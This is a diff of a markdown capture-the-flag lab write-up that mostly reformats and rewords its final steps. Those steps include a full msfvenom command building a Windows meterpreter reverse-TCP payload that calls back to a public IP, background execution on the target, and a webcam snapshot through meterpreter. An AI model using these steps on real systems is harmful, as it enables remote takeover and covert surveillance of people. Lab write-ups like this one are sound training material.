@@ -775,17 +775,21 @@ The one hint provided to us was the final step involves taking a snapshot from a
 
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=52.12.133.246 LPORT=17011 -f exe > win_the_war.exe
 
-    -p for a payload, specifically a Windows meterpreter which will create a reverse tcp connection
-    LHOST is the IP address meterpreter will connect to, in this case the public IP of my AWS VPN.
-    LPORT is the port meterpreter will connect to
-    -f for fomat, in this case windows executable or exe
-    and finally we redirect the output into a file named “win_the_war.exe”
+-p for a payload, specifically a Windows meterpreter which will create a reverse tcp connection
+
+LHOST is the IP address meterpreter will connect to, in this case the public IP of my AWS VPN.
+
+LPORT is the port meterpreter will connect to
+
+-f for fomat, in this case windows executable or exe
+
+and finally we redirect the output into a file named “win_the_war.exe”
 
 ![](/images/boykin_lab2/87. msfvenom.png)
 
 For my setup, I connect from my home network to a VPN server I have set up on AWS.  From there I connect to the target, which means the public IP address the meterpreter needs to call back to is the AWS VPN public IP, not my home IP address.  So, I needed to set up ssh tunnels to direct the connection to my Kali machine.
 
-The first step was to open up a port on the AWS management console's security group, in this case 17011.
+The first step was to open up a port on the AWS management console's security group, in this case 17011, and only for traffic from 70.242.177.5.
 
 ![](/images/boykin_lab2/88. aws.png)
 
@@ -847,7 +851,7 @@ Now we run the handler to start it:
 
 ![](/images/boykin_lab2/97. run.png)
 
-Once multi handler is ready, on the Windows target we execute win_the_war.exe, using “start /B" to run it in the background in case anything goes wrong it should not cause our nc connection to hang:
+Once multi handler is ready, on the Windows target we execute win_the_war.exe, using “start /B".  Using start /B runs our executable in the background so if the program crashes or hangs, it should not disrupt our nc connection:
 
     start /B win_the_war.exe
 
@@ -868,11 +872,11 @@ Next for the webcam shot. In our meterpreter session we run the following comman
 
 ![](/images/boykin_lab2/101. webcam_snap.png)
 
-    webcam_snap -i 2 should be successful, and you have the final flag:
+webcam_snap -i 2 should be successful, and you have the final flag:
 
 ![](/images/boykin_lab2/102. final_flag.png)
 
-As of mid-September 2020, this concludes the lab.  But wait, what happened to 10.136.0.5?  We saw it on our initial ping scan from 10.136.0.2, but never exploited it.  As of this writing, 10.136.0.5 was a salt-minion which could be exploited using the same technique (python3 reverse shell).  However, it was not configured with additional challenges or flags for the lab so I did not show any of the steps or settings on it in this write up in case CaptBoykin decides to incorporate it into the lab in the future.
+As of mid-September 2020, this concludes the lab.  But wait, what happened to 10.136.0.5?  We saw it on our initial ping scan from 10.136.0.2, but never exploited it.  As of this writing, 10.136.0.5 was a salt-minion which could be exploited using the same technique (python3 reverse shell).  However, it was not configured with additional challenges or flags for the lab so I did not show any of the steps or settings on it here in case CaptBoykin decides to use that machine to add to the lab in the future.
 
 <p>&nbsp;</p>
 =======================================================
